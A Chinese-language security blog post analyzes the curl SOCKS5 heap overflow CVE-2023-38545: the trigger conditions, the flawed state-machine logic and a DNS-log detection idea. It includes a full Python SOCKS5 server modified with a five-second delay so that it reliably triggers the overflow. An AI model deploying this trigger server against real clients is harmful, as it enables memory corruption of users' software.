# 从CURL碓溢出漏洞(CVE-2023-38545)谈谈漏洞和风险管理

CURL这个组件大家都熟悉，是一个用来发送HTTP请求的命令行工具，同时也有libcurl的库，可以方便其他软件集成自己的能力。

## 漏洞背景

最近，CURL的作者在讨论区提到了近期会发布一个新版本，其中会修复两个漏洞，其中一个漏洞被标记为高危，近期安全圈子里的一个明星组件，我也一直在保持关注。

![image-20231012100038486](/Users/jinxu/Library/Application Support/typora-user-images/image-20231012100038486.png)

并且提到

> *everything* that uses libcurl could theoretically use libcurl in a way that triggers this vulnerability.

大家摒气凝神：万一是一个log4shell接下来就该通宵修漏洞了。不过还好还好，一个安全研究员发现redhat提取更新了补丁的patch和test-case.

![image-20231012100643173](/Users/jinxu/Library/Application Support/typora-user-images/image-20231012100643173.png)

随着更多的热心网友的参与和漏洞细节被公开，大家长舒了一口气，还好还好，不是个啥大事，我拉了一份代码根据[原始报告](https://hackerone.com/reports/2187833)分析了一下，大概是这么个事：

> 1. 根据SOCKS协议，一个目的地的最大长度为 255 个字节(byte)。
> 2. 根据CURL对SOCKS协议的实现，这个HostName会被memcopy到buffer中，丢给SOCKS代理服务器。
> 3. 目的buffer: curl对socks协议开辟的一块空间，默认为16kB 。
> 4. 源buffer: HostName，限制如下：
>    1. 最大长度为64kb，超过这个长度无法利用（CURL支持的最大URL长度为64kb）。
>    2. 如果socks5协商已完成，HostName会被转为IP，无法利用。

作者还提到四个利用条件，锦旭搂了搂代码，分析了一下原因，和大家分享一下子，如果你也感兴趣的话，不用自己从头来了。

## 利用条件

有四个

#### 限制1: 请求使用socks5h

socks5是啥类，socks协议主要是管传输的，根据这个协议的设计，目的地址可以是个IP，也可以是个域名，如果是域名的话CURL就把这个叫做 socks5h(带hostname)，就是下面这个BND.ADDR👇

> ```
> +----+-----+-------+------+----------+----------+
> |VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |
> +----+-----+-------+------+----------+----------+
> | 1  |  1  | X'00' |  1   | Variable |    2     |
> +----+-----+-------+------+----------+----------+
> ```

- 用到socks5h == CURL DNS解析这个活交给了代理服务器，传一个域名+Port，和HTTP REQ的内容。

- 用到socks5 == CURL 本地解析好域名对应的IP，传一个IP+Port，和HTTP REQ的内容。

如果不是socks5h，则不影响。

#### 限制2: 本地的buffer设置，小于65kb

这个主要是CURL对URL的限制，最长只处理65kb的URL，过长就不干活了，走不到漏洞触发点。

#### 限制3: SOCKS服务器没有及时回复HELLO请求

有一个关键值是`socks5_resolve_local`，这玩意是个全局变量，只在`CONNECT_SOCKS_INIT`阶段里会改动这个值。

正常的逻辑：

> 1. socks5_resolve_local 默认为false
> 2. socks5初始化阶段 `CONNECT_SOCKS_INIT` 阶段设置为true，写入协商头，状态机到`CONNECT_SOCKS_READ`阶段，跳转到 `CONNECT_SOCKS_READ_INIT`（读返回阶段）
> 3. 一次读取完协商包，到 `CONNECT_REQ_INIT` 阶段
> 4. `CONNECT_SOCKS_INIT`检查发现`socks5_resolve_local`为True，调用`CONNECT_RESOLVED`，将DNS地址填充到协议的指定字段。
> 5. 后续就是和SOCKS5协议服务器的正常数据交互了

```
CONNECT_SOCKS_READ_INIT` => `CONNECT_SOCKS_READ "hello" packet (method selection reply)
```

出bug的逻辑：

> 1. 调用`do_SOCKS5`方法， `socks5_resolve_local `默认为false
> 2. socks5初始化阶段 `CONNECT_SOCKS_INIT` 阶段设置为true，写入协商头，状态机到`CONNECT_SOCKS_READ`阶段，跳转到 `CONNECT_SOCKS_READ_INIT`（读返回阶段）
> 3. `CONNECT_SOCKS_READ_INIT`读数据的时候，发现没有读到server的回包数据或者没读到指定数量（2个字节）的回包数据，返回`CURLPX_OK`
> 4. 上层继续调用 `do_SOCKS5`方法， **`socks5_resolve_local `默认为false**，此时状态机状态为 `CONNECT_SOCKS_READ`，继续从socks代理中读取数据（假设读取成果）
> 5. 走到 `CONNECT_REQ_INIT`,**检查发现 `socks5_resolve_local `为false**，认为应该远程解析，走到`CONNECT_RESOLVE_REMOTE`，把hostname整个memory-copy过去，于是产生堆溢出。

两个流程里1、2阶段一样，区别就在于3这个阶段，正常逻辑是一次读完了，流程退出。漏洞逻辑是一次没读完，方法退出导致走了 `CONNECT_RESOLVE_REMOTE` 逻辑后导致了堆溢出。

#### 限制4: 可控的比buffer长的Host的输入

这个不用多解释，要溢出，当然要源长度要比目的长度大，不然没法覆盖堆外的数据了。

## 稳定触发

在github上有人公开利用方法，但其实是不能稳定触发的，主要原因在于从tcp里读两个字节的握手包，还要求这两个字节通过两次recv才能收到，这个需要自己做一个恶意的socks5服务器才能稳定触发。构件一socks5服务器如下

```python
# -*- coding: utf-8 -*-
"""
 Small Socks5 Proxy Server in Python
 from https://github.com/MisterDaneel/
"""

# Network
import socket
import select
import time
from struct import pack, unpack
# System
import traceback
from threading import Thread, activeCount
from signal import signal, SIGINT, SIGTERM
from time import sleep
import sys

#
# Configuration
#
MAX_THREADS = 200
BUFSIZE = 10
TIMEOUT_SOCKET = 5
LOCAL_ADDR = '0.0.0.0'
LOCAL_PORT = 9050
# Parameter to bind a socket to a device, using SO_BINDTODEVICE
# Only root can set this option
# If the name is an empty string or None, the interface is chosen when
# a routing decision is made
# OUTGOING_INTERFACE = "eth0"
OUTGOING_INTERFACE = ""

#
# Constants
#
'''Version of the protocol'''
# PROTOCOL VERSION 5
VER = b'\x05'
'''Method constants'''
# '00' NO AUTHENTICATION REQUIRED
M_NOAUTH = b'\x00'
# 'FF' NO ACCEPTABLE METHODS
M_NOTAVAILABLE = b'\xff'
'''Command constants'''
# CONNECT '01'
CMD_CONNECT = b'\x01'
'''Address type constants'''
# IP V4 address '01'
ATYP_IPV4 = b'\x01'
# DOMAINNAME '03'
ATYP_DOMAINNAME = b'\x03'


class ExitStatus:
    """ Manage exit status """
    def __init__(self):
        self.exit = False

    def set_status(self, status):
        """ set exist status """
        self.exit = status

    def get_status(self):
        """ get exit status """
        return self.exit


def error(msg="", err=None):
    """ Print exception stack trace python """
    if msg:
        traceback.print_exc()
        print("{} - Code: {}, Message: {}".format(msg, str(err[0]), err[1]))
    else:
        traceback.print_exc()


def proxy_loop(socket_src, socket_dst):
    """ Wait for network activity """
    while not EXIT.get_status():
        try:
            reader, _, _ = select.select([socket_src, socket_dst], [], [], 1)
        except select.error as err:
            error("Select failed", err)
            return
        if not reader:
            continue
        try:
            for sock in reader:
                data = sock.recv(BUFSIZE)
                if not data:
                    return
                if sock is socket_dst:
                    socket_src.send(data)
                else:
                    socket_dst.send(data)
        except socket.error as err:
            error("Loop failed", err)
            return


def connect_to_dst(dst_addr, dst_port):
    """ Connect to desired destination """
    sock = create_socket()
    if OUTGOING_INTERFACE:
        try:
            sock.setsockopt(
                socket.SOL_SOCKET,
                socket.SO_BINDTODEVICE,
                OUTGOING_INTERFACE.encode(),
            )
        except PermissionError as err:
            print("Only root can set OUTGOING_INTERFACE parameter")
            EXIT.set_status(True)
    try:
        sock.connect((dst_addr, dst_port))
        return sock
    except socket.error as err:
        error("Failed to connect to DST", err)
        return 0


def request_client(wrapper):
    """ Client request details """
    # +----+-----+-------+------+----------+----------+
    # |VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |
    # +----+-----+-------+------+----------+----------+
    try:
        s5_request = wrapper.recv(BUFSIZE)
    except ConnectionResetError:
        if wrapper != 0:
            wrapper.close()
        error()
        return False
    # Check VER, CMD and RSV
    if (
            s5_request[0:1] != VER or
            s5_request[1:2] != CMD_CONNECT or
            s5_request[2:3] != b'\x00'
    ):
        return False
    # IPV4
    if s5_request[3:4] == ATYP_IPV4:
        dst_addr = socket.inet_ntoa(s5_request[4:-2])
        dst_port = unpack('>H', s5_request[8:len(s5_request)])[0]
    # DOMAIN NAME
    elif s5_request[3:4] == ATYP_DOMAINNAME:
        sz_domain_name = s5_request[4]
        dst_addr = s5_request[5: 5 + sz_domain_name - len(s5_request)]
        port_to_unpack = s5_request[5 + sz_domain_name:len(s5_request)]
        dst_port = unpack('>H', port_to_unpack)[0]
    else:
        return False
    print(dst_addr, dst_port)
    return (dst_addr, dst_port)


def request(wrapper):
    """
        The SOCKS request information is sent by the client as soon as it has
        established a connection to the SOCKS server, and completed the
        authentication negotiations.  The server evaluates the request, and
        returns a reply
    """
    dst = request_client(wrapper)
    # Server Reply
    # +----+-----+-------+------+----------+----------+
    # |VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |
    # +----+-----+-------+------+----------+----------+
    rep = b'\x07'
    bnd = b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00'
    if dst:
        socket_dst = connect_to_dst(dst[0], dst[1])
    if not dst or socket_dst == 0:
        rep = b'\x01'
    else:
        rep = b'\x00'
        bnd = socket.inet_aton(socket_dst.getsockname()[0])
        bnd += pack(">H", socket_dst.getsockname()[1])
    reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
    try:
        wrapper.sendall(reply)
    except socket.error:
        if wrapper != 0:
            wrapper.close()
        return
    # start proxy
    if rep == b'\x00':
        proxy_loop(wrapper, socket_dst)
    if wrapper != 0:
        wrapper.close()
    if socket_dst != 0:
        socket_dst.close()


def subnegotiation_client(wrapper):
    """
        The client connects to the server, and sends a version
        identifier/method selection message
    """
    # Client Version identifier/method selection message
    # +----+----------+----------+
    # |VER | NMETHODS | METHODS  |
    # +----+----------+----------+
    try:
        identification_packet = wrapper.recv(BUFSIZE)
    except socket.error:
        error()
        return M_NOTAVAILABLE
    # VER field
    if VER != identification_packet[0:1]:
        return M_NOTAVAILABLE
    # METHODS fields
    nmethods = identification_packet[1]
    methods = identification_packet[2:]
    if len(methods) != nmethods:
        return M_NOTAVAILABLE
    for method in methods:
        if method == ord(M_NOAUTH):
            return M_NOAUTH
    return M_NOTAVAILABLE


def subnegotiation(wrapper):
    """
        The client connects to the server, and sends a version
        identifier/method selection message
        The server selects from one of the methods given in METHODS, and
        sends a METHOD selection message
    """
    method = subnegotiation_client(wrapper)
    # Server Method selection message
    # +----+--------+
    # |VER | METHOD |
    # +----+--------+
    if method != M_NOAUTH:
        return False
    reply = VER + method
    try:
        wrapper.sendall(VER)
        time.sleep(5)
        wrapper.sendall(method)
    except socket.error:
        error()
        return False
    return True


def connection(wrapper):
    """ Function run by a thread """
    if subnegotiation(wrapper):
        request(wrapper)


def create_socket():
    """ Create an INET, STREAMing socket """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT_SOCKET)
    except socket.error as err:
        error("Failed to create socket", err)
        sys.exit(0)
    return sock


def bind_port(sock):
    """
        Bind the socket to address and
        listen for connections made to the socket
    """
    try:
        print('Bind {}'.format(str(LOCAL_PORT)))
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((LOCAL_ADDR, LOCAL_PORT))
    except socket.error as err:
        error("Bind failed", err)
        sock.close()
        sys.exit(0)
    # Listen
    try:
        sock.listen(10)
    except socket.error as err:
        error("Listen failed", err)
        sock.close()
        sys.exit(0)
    return sock


def exit_handler(signum, frame):
    """ Signal handler called with signal, exit script """
    print('Signal handler called with signal', signum)
    EXIT.set_status(True)


def main():
    """ Main function """
    new_socket = create_socket()
    bind_port(new_socket)
    signal(SIGINT, exit_handler)
    signal(SIGTERM, exit_handler)
    while not EXIT.get_status():
        if activeCount() > MAX_THREADS:
            sleep(3)
            continue
        try:
            wrapper, _ = new_socket.accept()
            wrapper.setblocking(1)
        except socket.timeout:
            continue
        except socket.error:
            error()
            continue
        except TypeError:
            error()
            sys.exit(0)
        recv_thread = Thread(target=connection, args=(wrapper, ))
        recv_thread.start()
    new_socket.close()


EXIT = ExitStatus()
if __name__ == '__main__':
    main()
```

关键代码：

```
	...
  wrapper.sendall(VER)
  time.sleep(5)
  wrapper.sendall(method)
  ...
```

## 漏洞证明

![image-20231012151015503](/Users/jinxu/Library/Application Support/typora-user-images/image-20231012151015503.png)

## 漏洞检测

根据漏洞原理，漏洞的特点是会在本地进行一次DNS请求，请求的对象是一个长度超过16kB的域名，可以以此为特征，在DNS日志中添加对应规则以检测此威胁。
